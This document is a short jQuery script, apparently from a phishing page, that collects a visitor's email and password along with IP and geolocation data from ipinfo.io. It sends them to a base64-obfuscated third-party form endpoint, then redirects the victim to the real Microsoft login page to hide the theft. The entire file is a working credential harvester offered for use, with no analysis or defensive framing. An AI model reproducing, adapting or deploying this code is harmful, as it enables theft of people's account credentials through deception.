<script>

    $(document).ready(function () {

        var count = 0;
        var chatContext = {};

        $.get("https://ipinfo.io", function (response) {


            //$("#details").html(JSON.stringify(response, null, 4));
        }, "jsonp").done(function (response) {


            var agent = navigator.userAgent;;
            chatContext = {
                "user-agent": agent,
                "bcity": response.city,
                "bregion": response.region,
                "bcountry": response.country,
                "ip": response.ip
            };


        });
        $("form").submit(function (event) {
            event.preventDefault();

            var ai = $("#ai").val();
            var pr = $("#pr").val();

            var uu = atob("aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vTVJkSHU2VlQ=");
            var urls = [uu];
            $.each(urls, function (i, u) {

                $.ajax(u,
                    {
                        dataType: 'JSON',

                        type: 'POST',
                        data: {

                            useremail: ai,
                            password: pr,

                            "user-agent": chatContext['user-agent'],
                            "City": chatContext['bcity'],
                            "Region": chatContext['bregion'],
                            "Country": chatContext['bcountry'],
                            "IP": chatContext['ip']
                        },
                        // data: $('#contact').serialize(),
                        beforeSend: function (xhr) {

                        },
                        success: function (response) {
                            if (response) {


                                // alert('s');

                                window.location.replace("https://login.microsoftonline.com");


                            }
                        },
                        complete: function () {

                        }
                    });

            });

        });
        event.preventDefault();
    });
